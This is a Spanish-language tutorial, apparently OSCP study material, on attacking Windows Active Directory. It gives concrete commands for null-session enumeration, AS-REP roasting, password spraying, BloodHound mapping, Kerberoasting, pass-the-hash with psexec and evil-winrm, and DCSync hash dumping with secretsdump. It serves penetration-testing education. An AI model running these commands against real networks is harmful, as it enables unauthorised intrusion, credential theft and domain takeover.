# Active Directory: Introducción y Metodología

**Active Directory (AD)** es el sistema de Microsoft para gestionar usuarios, equipos y permisos en redes corporativas Windows. Prácticamente **todas** las empresas lo usan, por lo que dominar su ataque es imprescindible para el pentesting profesional y para el **OSCP moderno** (que ya incluye AD en el examen).

Atacar AD no va de un solo exploit: va de **encadenar** información (usuarios → credenciales → permisos → movimiento lateral) hasta llegar a **Domain Admin** o comprometer el **Domain Controller (DC)**.

---

## Conceptos clave

| Término | Qué es |
| ------- | ------ |
| **Dominio** | Conjunto de objetos (usuarios, equipos) que comparten una base de datos de seguridad. |
| **Domain Controller (DC)** | Servidor que ejecuta AD; guarda todas las credenciales (base `NTDS.dit`). El objetivo final. |
| **Bosque (Forest)** | Conjunto de dominios relacionados. |
| **Kerberos** | Protocolo de autenticación de AD (tickets TGT/TGS). Puerto 88. |
| **LDAP** | Protocolo de consulta del directorio. Puertos 389/636. |
| **Usuario de dominio** | Cuenta válida en todo el dominio (distinta de una cuenta local). |
| **GPO** | Group Policy: políticas aplicadas a equipos/usuarios. Vector de ataque. |
| **SPN** | Service Principal Name: identifica un servicio asociado a una cuenta (base del Kerberoasting). |

> Si en el escaneo ves los puertos **88 (Kerberos), 389/636 (LDAP), 445 (SMB)** y **53 (DNS)** juntos, estás ante un **Domain Controller**.

---

## Metodología de ataque a AD

```flow
Enumeración sin credenciales :: Acceso anónimo: SMB, LDAP y lista de usuarios.
Primeras credenciales :: Password spraying, AS-REP Roasting o servicios.
Enumeración autenticada :: BloodHound: mapear todo el dominio.
Escalada y movimiento lateral :: Kerberoasting, abuso de ACLs, pivoting.
Dominio comprometido :: DCSync y volcado de NTDS.dit.
```

Como en cualquier máquina: **cada credencial nueva reinicia la enumeración** con más acceso.

---

## Fase 1 — Enumeración sin credenciales

```bash
# Usuarios y shares por SMB (null session)
netexec smb <DC_IP> -u '' -p '' --users --shares
enum4linux-ng -A <DC_IP>

# RID bruteforcing para sacar usuarios
netexec smb <DC_IP> -u '' -p '' --rid-brute

# LDAP anónimo
ldapsearch -x -H ldap://<DC_IP> -b "DC=dominio,DC=local"
```

Objetivo: obtener una **lista de usuarios** válidos del dominio.

---

## Fase 2 — Primeras credenciales

### AS-REP Roasting

Usuarios con "no requiere preautenticación Kerberos" permiten pedir un hash crackeable sin credenciales:

```bash
impacket-GetNPUsers dominio.local/ -usersfile usuarios.txt -dc-ip <DC_IP> -no-pass
# Crackea el hash $krb5asrep$ con hashcat (modo 18200)
hashcat -m 18200 hashes.txt rockyou.txt
```

### Password Spraying

Probar **una** contraseña común contra **todos** los usuarios (evita bloqueos):

```bash
netexec smb <DC_IP> -u usuarios.txt -p 'Primavera2024!' --continue-on-success
```

---

## Fase 3 — Enumeración autenticada (BloodHound)

Con cualquier credencial válida, recolecta el grafo del dominio:

```bash
# Recolección remota con el ingestor de Python
bloodhound-python -u '<user>' -p '<pass>' -d dominio.local -ns <DC_IP> -c All
# o con netexec:
netexec ldap <DC_IP> -u <user> -p <pass> --bloodhound --collection All
```

Importa el resultado en **BloodHound** y usa las consultas preconstruidas: "Shortest path to Domain Admins", cuentas kerberoastables, ACLs abusables, sesiones. BloodHound te **dibuja el camino** hacia el dominio.

---

## Fase 4 — Escalada y movimiento lateral

### Kerberoasting

Cuentas de servicio con SPN permiten pedir un ticket cuyo hash se crackea offline:

```bash
impacket-GetUserSPNs dominio.local/<user>:<pass> -dc-ip <DC_IP> -request
hashcat -m 13100 hashes.txt rockyou.txt
```

### Pass-the-Hash / movimiento lateral

Si tienes el hash NTLM, no necesitas la contraseña:

```bash
netexec smb <IP> -u <user> -H <hash_NTLM>
impacket-psexec dominio/<user>@<IP> -hashes :<hash_NTLM>
evil-winrm -i <IP> -u <user> -H <hash_NTLM>
```

### Abuso de ACLs y GPO

BloodHound te marcará permisos abusables (GenericAll, WriteDACL, etc.) para tomar control de otros objetos.

---

## Fase 5 — Comprometer el dominio

Con privilegios de Domain Admin o permisos de replicación → **DCSync** (volcar todos los hashes del dominio):

```bash
impacket-secretsdump dominio/<admin>:<pass>@<DC_IP>
# o apuntando a un usuario concreto
impacket-secretsdump -just-dc-user krbtgt dominio/<admin>@<DC_IP>
```

Con el hash de **krbtgt** puedes forjar un **Golden Ticket** (persistencia total en el dominio).

---

## Herramientas relacionadas

| Herramienta | Uso |
| ----------- | --- |
| `netexec` (nxc) | Enumeración y ataques masivos SMB/LDAP/WinRM. |
| `BloodHound` + ingestors | Mapear y encontrar caminos de ataque. |
| `impacket` (suite) | GetNPUsers, GetUserSPNs, secretsdump, psexec… |
| `evil-winrm` | Shell remota con credenciales/hash. |
| `hashcat` | Crackear hashes AS-REP (18200) y TGS (13100). |
| `enum4linux-ng` | Enumeración SMB/LDAP. |
| `kerbrute` | Enumeración de usuarios y spraying vía Kerberos. |

---

> **Consejo:** no ataques AD a ciegas. El flujo ganador es: saca usuarios → consigue una credencial (AS-REP/spraying) → mete todo en **BloodHound** → sigue el camino que te dibuja hacia Domain Admin. BloodHound convierte un dominio enorme y confuso en un mapa claro de "haz esto, luego esto". Es la herramienta que más vas a usar.
